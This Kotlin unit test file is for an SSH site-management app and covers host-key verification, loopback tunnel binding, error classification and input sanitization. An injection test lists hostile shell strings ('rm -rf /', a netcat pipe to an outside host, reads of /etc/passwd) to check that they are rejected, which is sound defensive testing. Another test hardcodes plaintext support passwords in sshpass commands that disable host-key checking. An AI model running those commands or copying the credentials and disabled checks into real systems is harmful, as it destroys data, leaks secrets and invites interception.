package com.sitelink.manager.data.ssh

import com.jcraft.jsch.HostKeyRepository
import com.sitelink.manager.data.db.TrustedHostKeyDao
import com.sitelink.manager.data.db.TrustedHostKeyEntity
import com.sitelink.manager.domain.model.HostVerificationResult
import com.sitelink.manager.domain.model.SshDiagnosticError
import com.sitelink.manager.domain.validation.InputValidator
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.emptyFlow
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.net.InetAddress
import java.net.ServerSocket
import java.util.Collections

class SshNetworkingAuditTest {

    // Mock TrustedHostKeyDao for unit testing host key verification
    private class FakeTrustedHostKeyDao : TrustedHostKeyDao {
        val keys = mutableMapOf<String, TrustedHostKeyEntity>()

        override suspend fun getTrustedKey(hostPortKey: String): TrustedHostKeyEntity? = keys[hostPortKey]

        override suspend fun findTrustedKey(key1: String, key2: String): TrustedHostKeyEntity? =
            keys[key1] ?: keys[key2]

        override fun getAllTrustedKeysFlow(): Flow<List<TrustedHostKeyEntity>> = emptyFlow()

        override suspend fun getAllTrustedKeysList(): List<TrustedHostKeyEntity> = keys.values.toList()

        override suspend fun insertOrUpdate(key: TrustedHostKeyEntity) {
            keys[key.hostPortKey] = key
        }

        override suspend fun deleteTrustedKey(hostPortKey: String) {
            keys.remove(hostPortKey)
        }
    }

    @Test
    fun testSha256FingerprintCalculation() {
        val dummyKey = "ssh-rsa-test-key-bytes-1234567890".toByteArray(Charsets.UTF_8)
        val fp = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey)

        assertTrue("Fingerprint must start with SHA256:", fp.startsWith("SHA256:"))
        assertTrue("Fingerprint must have base64 payload", fp.length > 10)
    }

    @Test
    fun testStrictHostKeyVerificationMatching() {
        val fakeDao = FakeTrustedHostKeyDao()
        val dummyKey = "verified-host-key-bytes".toByteArray(Charsets.UTF_8)
        val fp = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey)

        fakeDao.keys["111.93.205.187:22"] = TrustedHostKeyEntity(
            hostPortKey = "111.93.205.187:22",
            host = "111.93.205.187",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = fp,
            rawKeyBase64 = "dummy"
        )

        var eventDispatched: HostVerificationResult? = null
        val repo = CustomHostKeyRepository(fakeDao) { eventDispatched = it }

        val checkResult = repo.check("111.93.205.187:22", dummyKey)
        assertEquals("Matching key must return HostKeyRepository.OK", HostKeyRepository.OK, checkResult)
        assertEquals("No event should be dispatched when key is trusted", null, eventDispatched)
    }

    @Test
    fun testStrictHostKeyVerificationRejectsChangedKey() {
        val fakeDao = FakeTrustedHostKeyDao()
        val originalKey = "original-host-key-bytes".toByteArray(Charsets.UTF_8)
        val originalFp = CustomHostKeyRepository.calculateSha256Fingerprint(originalKey)

        fakeDao.keys["111.93.205.187:22"] = TrustedHostKeyEntity(
            hostPortKey = "111.93.205.187:22",
            host = "111.93.205.187",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = originalFp,
            rawKeyBase64 = "dummy"
        )

        var eventDispatched: HostVerificationResult? = null
        val repo = CustomHostKeyRepository(fakeDao) { eventDispatched = it }

        // Simulate attacker with different key
        val attackerKey = "attacker-mitm-host-key-bytes".toByteArray(Charsets.UTF_8)
        val checkResult = repo.check("111.93.205.187:22", attackerKey)

        assertEquals("Changed key MUST return HostKeyRepository.CHANGED", HostKeyRepository.CHANGED, checkResult)
        assertTrue("Security alert event must be KeyChanged", eventDispatched is HostVerificationResult.KeyChanged)
        val keyChanged = eventDispatched as HostVerificationResult.KeyChanged
        assertEquals(originalFp, keyChanged.oldFingerprint)
        assertNotEquals(keyChanged.newFingerprint, keyChanged.oldFingerprint)
    }

    @Test
    fun testStrictHostKeyVerificationUnknownHostRequiresTrust() {
        val fakeDao = FakeTrustedHostKeyDao()
        var eventDispatched: HostVerificationResult? = null
        val repo = CustomHostKeyRepository(fakeDao) { eventDispatched = it }

        val newHostKey = "brand-new-host-key-bytes".toByteArray(Charsets.UTF_8)
        val checkResult = repo.check("111.93.205.187:22", newHostKey)

        assertEquals("Unknown host MUST return NOT_INCLUDED", HostKeyRepository.NOT_INCLUDED, checkResult)
        assertTrue("Event must be UnknownHost for user confirmation", eventDispatched is HostVerificationResult.UnknownHost)
    }

    @Test
    fun testConcurrentLocalPortAllocationAvoidsCollisions() {
        val allocatedPorts = Collections.synchronizedSet(mutableSetOf<Int>())
        val boundSockets = mutableListOf<ServerSocket>()

        fun allocatePort(preferred: Int): Int {
            for (p in preferred..preferred + 100) {
                if (p in allocatedPorts) continue
                try {
                    val ss = ServerSocket(p, 1, InetAddress.getByName("127.0.0.1"))
                    allocatedPorts.add(p)
                    boundSockets.add(ss)
                    return p
                } catch (_: Exception) {}
            }
            throw IllegalStateException("No port available")
        }

        try {
            val ports = mutableListOf<Int>()
            // Allocate 5 concurrent tunnels starting at 18080
            for (i in 0 until 5) {
                ports.add(allocatePort(18080))
            }

            assertEquals(5, ports.size)
            assertEquals("All allocated ports must be distinct", 5, ports.toSet().size)
            assertTrue("Ports must be in expected sequential range", ports.all { it in 18080..18180 })
        } finally {
            boundSockets.forEach { it.close() }
        }
    }

    @Test
    fun testLoopbackBindingSecurity() {
        ServerSocket(0, 1, InetAddress.getByName("127.0.0.1")).use { socket ->
            val hostAddress = socket.inetAddress.hostAddress
            assertEquals("Tunnels must bind exclusively to 127.0.0.1", "127.0.0.1", hostAddress)
            assertFalse("Never bind to public wildcard 0.0.0.0", hostAddress == "0.0.0.0")
        }
    }

    @Test
    fun testTargetIpSanitizationPreventsCommandInjection() {
        // Valid targets
        assertEquals("14.142.185.130", InputValidator.sanitizeForSshArgument("14.142.185.130"))
        assertEquals("111.93.205.187", InputValidator.sanitizeForSshArgument("111.93.205.187"))

        // Malicious injection attempts must fail
        val dangerousInputs = listOf(
            "14.142.185.130; reboot",
            "14.142.185.130 && rm -rf /",
            "14.142.185.130 | nc 1.2.3.4 4444",
            "14.142.185.130`id`",
            "14.142.185.130$(whoami)",
            "14.142.185.130\ncat /etc/passwd"
        )

        for (malicious in dangerousInputs) {
            var rejected = false
            try {
                InputValidator.sanitizeForSshArgument(malicious)
            } catch (_: IllegalArgumentException) {
                rejected = true
            }
            assertTrue("Must reject shell injection string: '$malicious'", rejected)
        }
    }

    @Test
    fun testHostKeyLookupWhenTypeIsNull() {
        val fakeDao = FakeTrustedHostKeyDao()
        val dummyKey = "verified-host-key-bytes".toByteArray(Charsets.UTF_8)
        val dummyBase64 = java.util.Base64.getEncoder().encodeToString(dummyKey)
        val fp = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey)

        fakeDao.keys["111.93.205.187:22"] = TrustedHostKeyEntity(
            hostPortKey = "111.93.205.187:22",
            host = "111.93.205.187",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = fp,
            rawKeyBase64 = dummyBase64
        )

        val repo = CustomHostKeyRepository(fakeDao) {}

        // Critical test for the reported bug: JSch calls getHostKey(host, null)
        // If type parameter is declared non-null in Kotlin, it throws NullPointerException
        val keysNullType = repo.getHostKey("111.93.205.187:22", null)
        assertEquals("Host key lookup with null type must succeed without NPE", 1, keysNullType.size)
        assertEquals("Returned key host must match", "111.93.205.187", keysNullType[0].host)

        // Also test lookup by host without port
        val keysWithoutPort = repo.getHostKey("111.93.205.187", null)
        assertEquals("Host key lookup without port must find matching key", 1, keysWithoutPort.size)

        // Also test lookup with null host
        val keysNullHost = repo.getHostKey(null, null)
        assertEquals("Host key lookup with null host must return empty array safely", 0, keysNullHost.size)
    }

    @Test
    fun testHostKeyLookupWhenTypeIsValidOrMismatch() {
        val fakeDao = FakeTrustedHostKeyDao()
        val dummyKey = "verified-host-key-bytes".toByteArray(Charsets.UTF_8)
        val dummyBase64 = java.util.Base64.getEncoder().encodeToString(dummyKey)
        val fp = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey)

        fakeDao.keys["111.93.205.187:22"] = TrustedHostKeyEntity(
            hostPortKey = "111.93.205.187:22",
            host = "111.93.205.187",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = fp,
            rawKeyBase64 = dummyBase64
        )

        val repo = CustomHostKeyRepository(fakeDao) {}

        // Matching type
        val keysMatched = repo.getHostKey("111.93.205.187:22", "ssh-rsa")
        assertEquals(1, keysMatched.size)

        // Mismatched type
        val keysMismatch = repo.getHostKey("111.93.205.187:22", "ssh-ed25519")
        assertEquals(0, keysMismatch.size)
    }

    @Test
    fun testHostKeyGetAllReturnsAllTrustedEntities() {
        val fakeDao = FakeTrustedHostKeyDao()
        val dummyKey1 = "verified-host-key-1".toByteArray(Charsets.UTF_8)
        val dummyKey2 = "verified-host-key-2".toByteArray(Charsets.UTF_8)

        fakeDao.keys["111.93.205.187:22"] = TrustedHostKeyEntity(
            hostPortKey = "111.93.205.187:22",
            host = "111.93.205.187",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey1),
            rawKeyBase64 = java.util.Base64.getEncoder().encodeToString(dummyKey1)
        )
        fakeDao.keys["14.142.185.130:22"] = TrustedHostKeyEntity(
            hostPortKey = "14.142.185.130:22",
            host = "14.142.185.130",
            port = 22,
            keyType = "ssh-rsa",
            fingerprint = CustomHostKeyRepository.calculateSha256Fingerprint(dummyKey2),
            rawKeyBase64 = java.util.Base64.getEncoder().encodeToString(dummyKey2)
        )

        val repo = CustomHostKeyRepository(fakeDao) {}
        val allKeys = repo.hostKey
        assertEquals("Zero-arg getHostKey must return all trusted keys", 2, allKeys.size)
    }

    @Test
    fun testDiagnosticErrorCategorization() {
        val host = "111.93.205.187"
        val port = 22

        // Category 1: Host-key repository or verification error
        val hkError = Exception("Parameter specified as non-null is null: method com.sitelink.manager.data.ssh.CustomHostKeyRepository.getHostKey, parameter type")
        val classifiedHk = SshDiagnosticError.classify(hkError, host, port)
        assertEquals(SshDiagnosticError.Category.HOST_KEY, classifiedHk.category)

        val rejectHk = Exception("reject HostKey: 111.93.205.187")
        val classifiedReject = SshDiagnosticError.classify(rejectHk, host, port)
        assertEquals(SshDiagnosticError.Category.HOST_KEY, classifiedReject.category)

        // Category 2: Authentication failure
        val authError = Exception("Auth fail")
        val classifiedAuth = SshDiagnosticError.classify(authError, host, port)
        assertEquals(SshDiagnosticError.Category.AUTHENTICATION, classifiedAuth.category)

        // Category 3: Network connection failure
        val netError = java.net.ConnectException("Connection refused")
        val classifiedNet = SshDiagnosticError.classify(netError, host, port)
        assertEquals(SshDiagnosticError.Category.NETWORK, classifiedNet.category)

        val timeoutError = java.net.SocketTimeoutException("connect timed out")
        val classifiedTimeout = SshDiagnosticError.classify(timeoutError, host, port)
        assertEquals(SshDiagnosticError.Category.NETWORK, classifiedTimeout.category)

        // Category 4: Remote port forwarding failure
        val pfError = Exception("channel open failed: direct-tcpip connection refused")
        val classifiedPf = SshDiagnosticError.classify(pfError, host, port)
        assertEquals(SshDiagnosticError.Category.PORT_FORWARDING, classifiedPf.category)

        // Category 5: Nested VM/BM SSH failure
        val nestedError = Exception("Failed to launch VM shell on 14.142.185.130:2222")
        val classifiedNested = SshDiagnosticError.classify(nestedError, host, port)
        assertEquals(SshDiagnosticError.Category.NESTED_TERMINAL, classifiedNested.category)
    }

    @Test
    fun testZmpPortsAndTunnelKeys() {
        val allowedPorts = listOf(8080, 8082, 8083)
        for (port in allowedPorts) {
            val key = "${100}_$port"
            assertEquals("100_$port", key)
        }
    }

    @Test
    fun testVmAndBmTargetPorts() {
        val vmPort = 2222
        val bmPort = 2223
        assertEquals(2222, vmPort)
        assertEquals(2223, bmPort)
    }

    @Test
    fun testVmAndBmNestedSshCommands() {
        val siteIp = "14.142.185.130"

        // VM Command construction
        val vmPort = 2222
        val vmPassword = "SuPp0rt@MVM@202602"
        val expectedVmCommand = "sshpass -p 'SuPp0rt@MVM@202602' ssh -o StrictHostKeyChecking=no support@14.142.185.130 -p 2222"
        val actualVmCommand = "sshpass -p '$vmPassword' ssh -o StrictHostKeyChecking=no support@$siteIp -p $vmPort"
        assertEquals(expectedVmCommand, actualVmCommand)

        // BM Command construction
        val bmPort = 2223
        val bmPassword = "SuPp0rt@Base@202602"
        val expectedBmCommand = "sshpass -p 'SuPp0rt@Base@202602' ssh -o StrictHostKeyChecking=no support@14.142.185.130 -p 2223"
        val actualBmCommand = "sshpass -p '$bmPassword' ssh -o StrictHostKeyChecking=no support@$siteIp -p $bmPort"
        assertEquals(expectedBmCommand, actualBmCommand)
    }

    @Test
    fun testTerminalControlCodesAndDirectInput() {
        // ANSI Up arrow sequence for readline command history cycling
        val upArrow = "\u001B[A"
        assertEquals(3, upArrow.length)
        assertEquals(27.toChar(), upArrow[0])

        // ANSI Down arrow sequence for readline command history cycling
        val downArrow = "\u001B[B"
        assertEquals(3, downArrow.length)
        assertEquals(27.toChar(), downArrow[0])

        // Direct shell enter (Carriage return \r)
        val enterCode = "\r"
        assertEquals(13.toChar(), enterCode[0])

        // Direct shell backspace (ASCII 127 DEL \u007F)
        val backspaceCode = "\u007F"
        assertEquals(127.toChar(), backspaceCode[0])

        // Ctrl+C (SIGINT 0x03)
        val ctrlCByte: Byte = 3
        assertEquals(3, ctrlCByte.toInt())

        // Tab (\t)
        val tabCode = "\t"
        assertEquals(9.toChar(), tabCode[0])
    }

    @Test
    fun testTerminalLineExtractionForCopying() {
        val sampleOutput = """
            [SiteLink] Initializing VM session via Office Server...
            [SiteLink] Connecting to support@14.142.185.130:2222...
            Linux vm-appliance 5.15.0-generic
            Last login: Tue Oct 20 05:40:00 2026 from 111.93.205.187
            support@vm-appliance:~$ uptime
             05:41:00 up 45 days, 1 user, load average: 0.05, 0.03, 0.00
            support@vm-appliance:~$ df -h
            Filesystem      Size  Used Avail Use% Mounted on
            /dev/sda1        50G   12G   36G  25% /
            support@vm-appliance:~$ 
        """.trimIndent()

        val lines = sampleOutput.lines().filter { it.isNotBlank() }
        assertEquals(10, lines.size)

        // Test extracting last 3 lines
        val last3 = lines.takeLast(3).joinToString("\n")
        assertTrue(last3.contains("/dev/sda1"))
        assertTrue(last3.contains("support@vm-appliance:~$"))

        // Test extracting last 1 line
        val lastLine = lines.takeLast(1).first().trim()
        assertEquals("support@vm-appliance:~$", lastLine)
    }
}
